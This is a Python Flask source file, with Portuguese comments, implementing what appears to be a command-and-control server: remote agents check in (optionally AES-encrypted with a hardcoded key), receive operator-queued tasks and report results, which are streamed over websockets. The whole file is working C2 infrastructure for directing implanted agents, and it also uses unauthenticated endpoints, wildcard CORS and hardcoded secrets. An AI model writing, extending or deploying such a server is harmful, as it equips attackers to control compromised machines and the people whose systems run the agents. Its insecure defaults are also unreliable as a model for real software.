from flask import Flask, request, jsonify
from flask_socketio import SocketIO
import json
import time
from Crypto.Cipher import AES
import base64


app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret' # coloquei só para exemplo
socketio = SocketIO(app, cors_allowed_origins="*")

agents = {}
command_history = {}
SECRET_KEY = b"12345678901234567890123456789012"

def encrypt_data(plain_data: bytes) -> bytes:
    cipher = AES.new(SECRET_KEY, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(plain_data)
    
    return cipher.nonce + tag + ciphertext

def decrypt_data(encrypted_data: bytes) -> bytes:
    nonce = encrypted_data[:16]
    tag = encrypted_data[16:32]
    ciphertext = encrypted_data[32:]
    
    cipher = AES.new(SECRET_KEY, AES.MODE_EAX, nonce=nonce)
    plaintext = cipher.decrypt_and_verify(ciphertext, tag)
    return plaintext

@app.route("/checkin", methods=["POST"])
def checkin():
    req = request.json or {}
    
    if "data" in req:
        decrypted = decrypt_data(base64.b64decode(req["data"]))
        data = json.loads(decrypted)
    else:
        data = req 
    
    agent_info = data.get("agent_info", {})
    sid = agent_info.get("sid")
    
    if not sid:
        return jsonify({"error": "Missing SID"}), 400
    
    agents[sid] = {**agents.get(sid,{}), **agent_info}
    
    if sid not in command_history:
        command_history[sid] = []
        
    socketio.emit("agent_update", agent_info)
        
    tasks = command_history[sid]
    command_history[sid] = []
    
    response = {"tasks": tasks}
    
    if "data" in req:
        encrypted = base64.b64encode(encrypt_data(json.dumps(response).encode())).decode()
        return jsonify({"data": encrypted})
    return jsonify(response)

@app.route("/result", methods=["POST"])
def receive_result():
    data = request.json or {}
    
    sid = data.get("sid")
    
    if not sid:
        return jsonify({"error": "Missing SID"}), 400
    
    print(f"[*] Resultado do agent {sid}:")
    print(data)
    
    socketio.emit("task_result", data)
    
    return jsonify({"status": "ok"})

@app.route("/task", methods=["POST"])
def send_task():
    data = request.json or {}
    
    sid = data.get("sid")
    action = data.get("action")
    params = data.get("params", {})
    
    if not action:
        return jsonify({"error": "Missing action"}), 400
    
    if sid not in agents:
        return jsonify({"error": "Agent not found"}), 404
    
    if sid not in command_history:
        command_history[sid] = []
    
    task = {"task_id": str(time.time()),
            "action": action,
            "params": params}
    
    command_history[sid].append(task)
    
    return jsonify({"status": "task queued"})

@app.route("/agents", methods=["GET"])
def list_agents():
    return jsonify(agents)

if __name__ == "__main__":
    socketio.run(app, host="0.0.0.0", port=8080, allow_unsafe_werkzeug=True)

